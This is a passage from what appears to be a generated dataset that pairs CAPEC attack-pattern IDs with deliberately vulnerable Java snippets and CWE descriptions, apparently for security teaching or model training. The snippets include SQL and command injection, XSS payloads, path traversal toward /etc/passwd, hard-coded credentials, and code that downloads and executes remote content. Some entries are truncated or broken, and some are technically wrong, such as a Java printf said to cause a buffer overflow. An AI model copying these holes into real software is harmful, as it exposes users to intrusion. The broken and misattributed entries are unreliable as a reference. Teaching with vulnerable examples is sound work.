        "code_snippet": "public class PasswordRecovery {\n    private String username;\n    private String password;\n    private String securityQuestion;\n    private String securityAnswer;\n\n    public PasswordRecovery(String username, String password, String securityQuestion, String securityAnswer) {\n        this.username = username;\n        this.password = password; // Storing password in recoverable format (CWE-257)\n        this.securityQuestion = securityQuestion;\n        this.securityAnswer = securityAnswer;\n    }\n\n    public void recoverPassword(String answer) {\n        if (answer.equals(securityAnswer)) {\n            System.out.println(\"Your password is: \" + password); // Weak password recovery mechanism (CWE-640)\n        } else {\n            System.out.println(\"Incorrect answer\");\n        }\n    }\n\n    public static void main(String[] args) {\n        PasswordRecovery pr = new PasswordRecovery(\"user\", \"password123\", \"What is your favorite color?\", \"Blue\");\n        pr.recoverPassword(\"Blue\");\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism. It stores passwords in a recoverable format (CWE-257) and uses a simple security question to recover the password (CWE-640). The password is also weak (CWE-521) and is transmitted in plaintext (CWE-522). An attacker can easily intercept the password or use the weak password recovery mechanism to gain access to the system."
    },
    {
        "capec_id": "51",
        "code_snippet": "import java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport javax.xml.ws.Endpoint;\nimport javax.xml.ws.Service;\nimport javax.xml.ws.spi.ServiceDelegate;\nimport javax.xml.ws.spi.Provider;\n\npublic class VulnerableServiceRegistry {\n    private Map<String, String> serviceRegistry = new HashMap<>();\n\n    public void registerService(String serviceName, String serviceEndpoint) {\n        serviceRegistry.put(serviceName, serviceEndpoint);\n    }\n\n    public String getServiceEndpoint(String serviceName) {\n        return serviceRegistry.get(serviceName);\n    }\n\n    public static void main(String[] args) throws IOException {\n        VulnerableServiceRegistry registry = new VulnerableServiceRegistry();\n\n        // CWE-285: Improper Authorization\n        registry.registerService(\"myService\", \"http://malicious-service.com/myService\");\n\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        String userInput = \"myService\"><script>alert('XSS')</script>\";\n        registry.registerService(userInput, \"http://malicious-service.com/myService\");\n\n        // CWE-693: Protection Mechanism Failure\n        // No encryption or access control for the registry\n\n        // CWE-314: Cleartext Storage in the Registry\n        registry.registerService(\"myService\", \"http://cleartext-service.com/myService\");\n\n        // CWE-651: Exposure of WSDL File Containing Sensitive Information\n        Endpoint.publish(\"http://localhost:8080/myService\", new MyService());\n        System.out.println(\"Service published. WSDL available at http://localhost:8080/myService?wsdl\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable service registry that is susceptible to various attacks. It lacks proper authorization, allowing unauthorized registration of services. It also fails to neutralize special elements in user input, making it vulnerable to injection attacks. The registry stores sensitive information in cleartext and exposes a WSDL file containing sensitive information. Additionally, it does not use encryption or access control, making it vulnerable to protection mechanism failure."
    },
    {
        "capec_id": "52",
        "code_snippet": "public class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"input\\u0000injection\";\n        String command = \"echo \" + userInput + \" > output.txt\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of embedding null bytes in input to the target software. The userInput string contains a null byte (\\u0000) which, when concatenated with the command string, may cause the command to be truncated at the null byte, allowing an attacker to inject malicious commands. This code embodies CWEs 158, 172, 173, 74, 20, 697, and 707, including improper neutralization of null bytes, encoding errors, and improper input validation."
    },
    {
        "capec_id": "53",
        "code_snippet": "public class VulnerableFilter {\n    public static void filterString(String input) {\n        if (input.endsWith(\"/\") || input.endsWith(\"%00/\")) {\n            System.out.println(\"Valid input: \" + input);\n        } else {\n            System.out.println(\"Invalid input: \" + input);\n        }\n    }\n\n    public static void main(String[] args) {\n        filterString(\"path/to/directory/\"); // valid input\n        filterString(\"path/to/directory%00/evil_input\"); // bypass filter\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable filter that checks if a string ends with a trailing slash character. However, it does not properly handle alternate encoding of NULL characters, allowing an adversary to embed a NULL mid-string and bypass the filter. The CWEs embodied in this code snippet include CWE-158 (Improper Neutralization of Null Byte or NUL Character), CWE-172 (Encoding Error), CWE-173 (Improper Handling of Alternate Encoding), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "54",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"input\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"username\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            while (rs.next()) {\n                System.out.println(rs.getString(1));\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL injection attacks (CWE-89). The application constructs an SQL query using user input without proper sanitization, allowing an attacker to inject malicious SQL code. The error message handling (CWE-209) also reveals sensitive information about the database environment. Additionally, the use of the GET request method with sensitive query strings (CWE-598) and the exposure of sensitive information through data queries (CWE-202) are also demonstrated. The improper neutralization of special elements in data query logic (CWE-943) is shown through the lack of input validation and sanitization."
    },
    {
        "capec_id": "55",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class InsecurePasswordStorage {\n    private Map<String, String> passwordHashes = new HashMap<>();\n\n    public void storePassword(String username, String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] passwordBytes = password.getBytes();\n            byte[] hashBytes = md.digest(passwordBytes);\n            String hash = new String(hashBytes);\n            passwordHashes.put(username, hash);\n        } catch (NoSuchAlgorithmException e) {\n            // handle exception\n        }\n    }\n\n    public boolean authenticate(String username, String password) {\n        String storedHash = passwordHashes.get(username);\n        if (storedHash != null) {\n            try {\n                MessageDigest md = MessageDigest.getInstance(\"MD5\");\n                byte[] passwordBytes = password.getBytes();\n                byte[] hashBytes = md.digest(passwordBytes);\n                String hash = new String(hashBytes);\n                return hash.equals(storedHash);\n            } catch (NoSuchAlgorithmException e) {\n                // handle exception\n            }\n        }\n        return false;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable password storage and authentication system. It uses MD5 hashing, which is a weak encoding for passwords (CWE-261), and does not enforce strong password requirements (CWE-521). The system also lacks password aging mechanisms (CWE-262) and relies solely on a single factor for authentication (CWE-308 and CWE-309). Furthermore, the use of MD5 hashing does not provide sufficient computational effort to prevent password cracking attacks (CWE-916). An attacker can use a rainbow table to look up the original password corresponding to the stored hash, and then use the original password to gain access to the system."
    },
    {
        "capec_id": "56",
        "code_snippet": "public class AuthenticationBypass {\n    public static void main(String[] args) {\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedRequest = \"captured_request_from_network_traffic\";\n        sendRequestToServer(capturedRequest);\n    }\n\n    public static void sendRequestToServer(String request) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Server-side security mechanism is not implemented\n        // and relies on client-side validation\n        if (request.contains(\"valid_request\")) {\n            System.out.println(\"Authenticated successfully\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n\n    // CWE-693: Protection Mechanism Failure\n    // Compiler optimization may remove or modify security-critical code\n    public static void securityCriticalCode() {\n        // Security-critical code that may be optimized away\n        if (System.getProperty(\"security.flag\") != null) {\n            System.out.println(\"Security mechanism enabled\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern of removing important client functionality, which is a duplicate of CAPEC-207. It includes CWE-294: Authentication Bypass by Capture-replay, CWE-602: Client-Side Enforcement of Server-Side Security, and CWE-693: Protection Mechanism Failure. The code shows a vulnerable authentication mechanism that relies on client-side validation and can be bypassed by capturing and replaying network traffic. Additionally, the code includes a security-critical mechanism that may be optimized away by the compiler, making it ineffective."
    },
    {
        "capec_id": "57",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        String sslTerminatedUrl = req.getParameter(\"sslTerminatedUrl\");\n\n        // CWE-287: Improper Authentication\n        // No authentication or verification of the user's identity\n        if (username != null && password != null) {\n            // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            // Sensitive information in the query string\n            String sensitiveData = \"username=\" + username + \"&password=\" + password;\n            resp.sendRedirect(sslTerminatedUrl + \"?\" + sensitiveData);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable REST-style application that trusts the system resources and environment to obtain sensitive data once SSL is terminated. It uses the HTTP GET method to process a request and includes sensitive information in the query string, violating CWE-598. Additionally, it lacks proper authentication and verification of the user's identity, violating CWE-287. The code also fails to ensure the integrity of the communication channel, allowing an actor that is not an endpoint to access or influence the channel, violating CWE-300. Furthermore, it stores security-critical state information in a location that is accessible to unauthorized actors, violating CWE-642. Finally, it does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks, violating CWE-693."
    },
    {
        "capec_id": "58",
        "code_snippet": "public class VulnerableService {\n    public void handleRequest(String requestMethod, String resourceId) {\n        if (requestMethod.equals(\"GET\")) {\n            // Assuming GET requests are safe and do not modify state\n            getResource(resourceId);\n        } else if (requestMethod.equals(\"PUT\")) {\n            // No access control or authorization checks\n            updateResource(resourceId);\n        } else if (requestMethod.equals(\"DELETE\")) {\n            // No access control or authorization checks\n            deleteResource(resourceId);\n        }\n    }\n\n    private void getResource(String resourceId) {\n        // No access control or authorization checks\n        System.out.println(\"Retrieved resource: \" + resourceId);\n    }\n\n    private void updateResource(String resourceId) {\n        // No access control or authorization checks\n        System.out.println(\"Updated resource: \" + resourceId);\n    }\n\n    private void deleteResource(String resourceId) {\n        // No access control or authorization checks\n        System.out.println(\"Deleted resource: \" + resourceId);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable service that accepts HTTP requests without proper access control or authorization checks, allowing an adversary to perform malicious actions such as updating or deleting resources without permission."
    },
    {
        "capec_id": "59",
        "code_snippet": "import java.util.Random;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class PredictableSessionID {\n    public static void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        HttpSession session = request.getSession(true);\n        String sessionId = session.getId();\n        // CWE-330: Use of Insufficiently Random Values\n        // CWE-331: Insufficient Entropy\n        int randomInt = new Random().nextInt(1000);\n        sessionId += \"_\" + randomInt;\n        Cookie cookie = new Cookie(\"JSESSIONID\", sessionId);\n        response.addCookie(cookie);\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-346: Origin Validation Error\n        // CWE-488: Exposure of Data Element to Wrong Session\n        // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length\n        // CWE-285: Improper Authorization\n        // CWE-384: Session Fixation\n        // CWE-693: Protection Mechanism Failure\n        // Predictable session ID is used to authenticate the user\n        if (sessionId.equals(\"expected_session_id\")) {\n            // Grant access to the user\n            response.setStatus(200);\n        } else {\n            // Deny access to the user\n            response.setStatus(401);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session ID management system. It generates a predictable session ID by appending a small random integer to the session ID, making it vulnerable to spoofing and session hijacking attacks. The code also fails to properly validate the origin of the request and does not invalidate existing session IDs, allowing an attacker to steal authenticated sessions."
    },
    {
        "capec_id": "60",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class SessionReplay extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        HttpSession session = req.getSession();\n        Cookie[] cookies = req.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"JSESSIONID\")) {\n                    session.setId(cookie.getValue()); // CWE-384: Session Fixation\n                    break;\n                }\n            }\n        }\n        // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        Cookie sensitiveCookie = new Cookie(\"sensitiveInfo\", \"secretData\");\n        sensitiveCookie.setMaxAge(31536000); // 1 year\n        resp.addCookie(sensitiveCookie);\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        resp.getWriter().println(\"Welcome, \" + session.getAttribute(\"username\"));\n    }\n}\n",
        "description": "This Java code snippet demonstrates a session replay attack, where an attacker can reuse a stolen session ID to spoof the target system and gain privileges. The code uses a persistent cookie to store sensitive information, which can be accessed by an unauthorized actor. The session ID is not properly validated, allowing an attacker to fixate the session and hijack the user's session. The code also exposes sensitive information to an unauthorized actor, violating authentication and authorization checks."
    },
    {
        "capec_id": "61",
        "code_snippet": "public class SessionFixationExample {\n    private static Map<String, User> sessions = new HashMap<>();\n\n    public static void login(String sessionId, String username, String password) {\n        if (authenticate(username, password)) {\n            User user = new User(username);\n            sessions.put(sessionId, user);\n        }\n    }\n\n    public static void elevatePrivileges(String sessionId) {\n        User user = sessions.get(sessionId);\n        if (user != null) {\n            user.setAdmin(true);\n        }\n    }\n\n    public static void performAction(String sessionId, String action) {\n        User user = sessions.get(sessionId);\n        if (user != null && user.isAdmin()) {\n            // perform action as admin\n            System.out.println(\"Performing action: \" + action);\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // dummy authentication logic\n        return true;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the Session Fixation attack. The `login` method authenticates a user and stores the user object in a map with the provided session ID as the key. The `elevatePrivileges` method elevates the user's privileges without invalidating the existing session ID. An attacker can then use the same session ID to perform actions as an admin. The code violates CWE-384 by not invalidating the existing session ID after privilege elevation, CWE-664 by not maintaining control over the session resource, CWE-732 by assigning incorrect permissions to the session resource, CWE-602 by relying on client-side session ID, and CWE-1270 by generating incorrect security tokens."
    },
    {
        "capec_id": "62",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String action = req.getParameter(\"action\");\n        if (action != null) {\n            if (action.equals(\"transferFunds\")) {\n                // No authentication or verification of user intent\n                transferFunds(req.getParameter(\"amount\"), req.getParameter(\"recipient\"));\n            }\n        }\n    }\n\n    private void transferFunds(String amount, String recipient) {\n        // No permission check or access control\n        // Directly access and modify critical resource (e.g., database)\n        Database database = new Database();\n        database.transferFunds(amount, recipient);\n    }\n\n    public class Database {\n        public void transferFunds(String amount, String recipient) {\n            // No control over resource lifetime\n            Connection connection = DriverManager.getConnection(\"url\", \"username\", \"password\");\n            Statement statement = connection.createStatement();\n            statement.executeUpdate(\"UPDATE accounts SET balance = balance - \" + amount + \" WHERE owner = '\" + recipient + \"'\");\n            // No proper resource release\n            // connection and statement are not closed\n        }\n    }\n}\n",
        "description": "This Java servlet is vulnerable to Cross-Site Request Forgery (CSRF) attacks, as it does not verify user intent or authenticate requests. It also lacks permission checks and access control, allowing unauthorized access to critical resources. Additionally, it improperly controls resources throughout their lifetime, failing to release them properly. The SameSite attribute for sensitive cookies is not set, making it vulnerable to CSRF attacks."
    },
    {
        "capec_id": "63",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<img src='\" + userInput + \"'>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Cross-Site Scripting (XSS) attacks. The servlet takes user input from the 'userInput' parameter and injects it into an HTML IMG tag without proper validation or neutralization, allowing an attacker to inject malicious scripts. This code embodies the CAPEC description and relates to CWEs 79, 20, 692, 82, and 81."
    },
    {
        "capec_id": "64",
        "code_snippet": "public class VulnerableURLDecoder {\n    public static void decodeURL(String url) {\n        try {\n            String decodedURL = URLDecoder.decode(url, \"UTF-8\");\n            String[] pathComponents = decodedURL.split(\"/\");\n            String filePath = \"\";\n            for (String component : pathComponents) {\n                filePath += component + \"/\";\n            }\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\"File found: \" + file.getAbsolutePath());\n            } else {\n                System.out.println(\"File not found\");\n            }\n        } catch (UnsupportedEncodingException e) {\n            System.out.println(\"Error decoding URL: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        decodeURL(\"http://example.com/%2e%2e/%2e%2e/%etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable URL decoder that is susceptible to path traversal attacks. The decodeURL method takes a URL as input, decodes it using the URLDecoder, and then constructs a file path from the decoded URL components. The method then checks if the file exists on the system. The vulnerability lies in the fact that the method does not properly validate the input URL, allowing an attacker to craft a URL that traverses the file system and accesses sensitive files. The CWEs embodied in this code snippet include CWE-177 (Improper Handling of URL Encoding), CWE-73 (External Control of File Name or Path), CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "65",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com/update.jar\");\n        URLConnection conn = url.openConnection();\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            // execute the downloaded code without integrity check\n            Runtime.getRuntime().exec(inputLine);\n        }\n        in.close();\n    }\n}\n",
        "description": "This Java code snippet downloads an executable JAR file from a remote location without any encryption or integrity check, and then executes the downloaded code without verifying its origin or integrity, making it vulnerable to attacks."
    },
    {
        "capec_id": "66",
        "code_snippet": "public class VulnerableSQLInjection {\n    public void getUserDetails(String username) {\n        String query = \"SELECT * FROM users WHERE username = '\" + username + \"';\";\n        try (Statement stmt = conn.createStatement()) {\n            ResultSet rs = stmt.executeQuery(query);\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \" \" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet is vulnerable to SQL Injection (CAPEC, CWE-89). The `getUserDetails` method constructs a SQL query using user input (`username`) without proper validation or sanitization, allowing an attacker to inject malicious SQL code. The error handling also discloses sensitive information (CWE-209). Additionally, the code does not close the database cursor properly, leaving it dangling (CWE-619)."
    },
    {
        "capec_id": "67",
        "code_snippet": "public class VulnerableSyslog {\n    public static void main(String[] args) {\n        String userInput = \"\"; // assume userInput is obtained from an untrusted source\n        syslog(userInput);\n    }\n\n    public static void syslog(String message) {\n        System.out.printf(message);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability in the syslog function. The syslog function uses the System.out.printf method, which accepts a format string as an argument. The format string is obtained from an untrusted source (userInput), allowing an attacker to inject malicious format string commands, leading to a buffer overflow. This code snippet embodies CWE-134 (Use of Externally-Controlled Format String), CWE-120 (Buffer Copy without Checking Size of Input), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-680 (Integer Overflow to Buffer Overflow), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "68",
        "code_snippet": "public class CodeSigningBypass {\n    public static void main(String[] args) {\n        // CWE-325: Missing Cryptographic Step\n        String unsignedCode = \"malicious_code_here\";\n        String weakHash = getWeakHash(unsignedCode);\n        // CWE-328: Use of Weak Hash\n        if (weakHash.equals(getExpectedHash())) {\n            // CWE-506: Embedded Malicious Code\n            executeMaliciousCode(unsignedCode);\n        }\n    }\n\n    private static String getWeakHash(String input) {\n        // Using a weak hash function like MD5\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] bytes = md.digest(input.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : bytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // Assuming the compiler optimizes away security checks\n        Runtime.getRuntime().exec(code);\n    }\n\n    private static boolean isHardwareRootOfTrustPresent() {\n        // CWE-1326: Missing Immutable Root of Trust in Hardware\n        return false; // Assuming no immutable root of trust\n    }\n}",
        "description": "This Java code snippet demonstrates a code signing bypass attack by exploiting various weaknesses. It uses a weak hash function (MD5) to verify the code's identity, which can be easily compromised. The code also contains embedded malicious code that can be executed if the weak hash verification succeeds. Additionally, the code assumes that the compiler optimizes away security checks, and there is no immutable root of trust in the hardware to prevent secure boot bypass."
    },
    {
        "capec_id": "69",
        "code_snippet": "import java.io.IOException;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.Scanner;\n\npublic class ElevatedPrivileges {\n    public static void main(String[] args) {\n        try {\n            String command = \"\";\n            if (System.getProperty(\"user.name\").equals(\"root\")) {\n                System.out.println(\"Running with elevated privileges\");\n                System.out.print(\"Enter a command to execute: \");\n                Scanner scanner = new Scanner(System.in);\n                command = scanner.nextLine();\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } else {\n                System.out.println(\"Running without elevated privileges\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error executing command: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of executing arbitrary code with elevated privileges. It checks if the program is running as the 'root' user and if so, allows the user to input a command to execute. The command is then executed using Runtime.getRuntime().exec(), which can lead to OS Command Injection (CWE-78) and Execution with Unnecessary Privileges (CWE-250). Additionally, the code may contain Embedded Malicious Code (CWE-506) and allows External Control of System or Configuration Setting (CWE-15) by allowing the user to input a command. The code also lacks proper Process Control (CWE-114) by executing commands from an untrusted source."
    },
    {
        "capec_id": "70",
        "code_snippet": "public class VulnerableLoginSystem {\n    private static final String DEFAULT_USERNAME = \"admin\";\n    private static final String DEFAULT_PASSWORD = \"password\";\n\n    public boolean authenticate(String username, String password) {\n        if (username.equals(DEFAULT_USERNAME) && password.equals(DEFAULT_PASSWORD)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        VulnerableLoginSystem loginSystem = new VulnerableLoginSystem();\n        boolean isAuthenticated = loginSystem.authenticate(\"admin\", \"password\");\n        if (isAuthenticated) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Invalid credentials.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable login system that uses hard-coded default credentials (CWE-798) and does not enforce strong password requirements (CWE-521). The system relies solely on a single factor of authentication (CWE-308) and does not implement password aging mechanisms (CWE-262). An attacker can easily gain access to the system by using the default credentials or by using a brute-force attack with common passwords."
    },
    {
        "capec_id": "71",
        "code_snippet": "public class UnicodeFilterBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u0022<script>alert('XSS')</script>\\u0022\";\n        if (userInput.matches(\"[a-zA-Z]+\")) {\n            System.out.println(\"Input is valid\");\n            // Process the input without proper encoding\n            String htmlResponse = \"<html><body>\" + userInput + \"</body></html>\";\n            System.out.println(htmlResponse);\n        } else {\n            System.out.println(\"Input is invalid\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of bypassing a content filter using Unicode encoding. The CWEs embodied in this code include CWE-176 (Improper Handling of Unicode Encoding), CWE-179 (Incorrect Behavior Order: Early Validation), CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize), CWE-173 (Improper Handling of Alternate Encoding), CWE-172 (Encoding Error), CWE-184 (Incomplete List of Disallowed Inputs), CWE-183 (Permissive List of Allowed Inputs), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-692 (Incomplete Denylist to Cross-Site Scripting). The code accepts user input containing Unicode characters, which is not properly validated or encoded, allowing an attacker to inject malicious data past the content filter."
    },
    {
        "capec_id": "72",
        "code_snippet": "public class URLDecoder { \n    public static void main(String[] args) { \n        String userInput = \\",
        "description": "This Java code snippet demonstrates the CAPEC of URL encoding manipulation. The code takes user input and decodes it using the URLDecoder class. The CWEs embodied in this code snippet include CWE-173 (Improper Handling of Alternate Encoding), CWE-177 (Improper Handling of URL Encoding), CWE-172 (Encoding Error), CWE-73 (External Control of File Name or Path), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), and CWE-20 (Improper Input Validation). The code does not properly validate or handle the user input, allowing an adversary to manipulate the URL encoding and potentially access unauthorized files."
    },
    {
        "capec_id": "73",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        String filename = req.getParameter(\"filename\");\n        String fileContent = req.getParameter(\"fileContent\");\n        File file = new File(filename);\n        PrintWriter writer = new PrintWriter(file);\n        writer.println(fileContent);\n        writer.close();\n        resp.sendRedirect(\"http://example.com/\" + filename);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload functionality. It receives a filename and file content from a user, creates a file with the provided filename, and writes the file content to it. Then, it redirects the user to a URL constructed by concatenating a base URL with the provided filename. This code is vulnerable to stored XSS attacks, as it does not validate or encode the user-provided input. An attacker can upload a file with a malicious filename, such as '<script>alert(\"XSS\")</script>.js', and the application will redirect the user to a URL that executes the script. This code embodies CWE-20 (Improper Input Validation), CWE-116 (Improper Encoding or Escaping of Output), and CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages)."
    },
    {
        "capec_id": "74",
        "code_snippet": "public class ShoppingCart { \n\tprivate String username; \n\tprivate String paymentInfo; \n\tprivate List<String> cartItems; \n\tprivate boolean isAdmin; \n\n\tpublic ShoppingCart(String username, String paymentInfo) { \n\t\tthis.username = username; \n\t\tthis.paymentInfo = paymentInfo; \n\t\tthis.cartItems = new ArrayList<>(); \n\t\tthis.isAdmin = false; \n\t} \n\n\tpublic void addItemToCart(String item) { \n\t\tcartItems.add(item); \n\t} \n\n\tpublic void checkout() { \n\t\tif (isAdmin) { \n\t\t\t// perform admin checkout \n\t\t} else { \n\t\t\t// perform regular checkout \n\t\t} \n\t} \n\n\tpublic void elevatePrivilege() { \n\t\tisAdmin = true; \n\t} \n\n\tpublic String getUsername() { \n\t\treturn username; \n\t} \n\n\tpublic String getPaymentInfo() { \n\t\treturn paymentInfo; \n\t} \n\n\tpublic List<String> getCartItems() { \n\t\treturn cartItems; \n\t} \n}",
        "description": "This Java code snippet demonstrates the CAPEC of modifying state information maintained by the target software. The ShoppingCart class has a flawed implementation of state management, allowing an adversary to manipulate user state and elevate privileges. The CWEs embodied in this code snippet include CWE-372 (Incomplete Internal State Distinction), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-693 (Protection Mechanism Failure). The code stores sensitive information in cleartext, does not properly determine its internal state, and lacks a protection mechanism to prevent unauthorized state transitions."
    },
    {
        "capec_id": "75",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter CVS repository path:\");\n        userInput = scanner.nextLine();\n\n        String cvsRepositoryPath = userInput;\n        String configFilePath = cvsRepositoryPath + \"config.properties\";\n\n        try (FileWriter writer = new FileWriter(configFilePath)) {\n            writer.write(\"username=admin\\npassword=password\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying manually edited files in a CVS repository, which can lead to unauthorized access to the application. The code accepts user input for the CVS repository path, constructs a config file path, and writes sensitive data (username and password) to the config file. This code is vulnerable to CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data), CWE-99 (Improper Control of Resource Identifiers), CWE-77 (Improper Neutralization of Special Elements used in a Command), CWE-346 (Origin Validation Error), CWE-353 (Missing Support for Integrity Check), and CWE-354 (Improper Validation of Integrity Check Value)."
    },
    {
        "capec_id": "76",
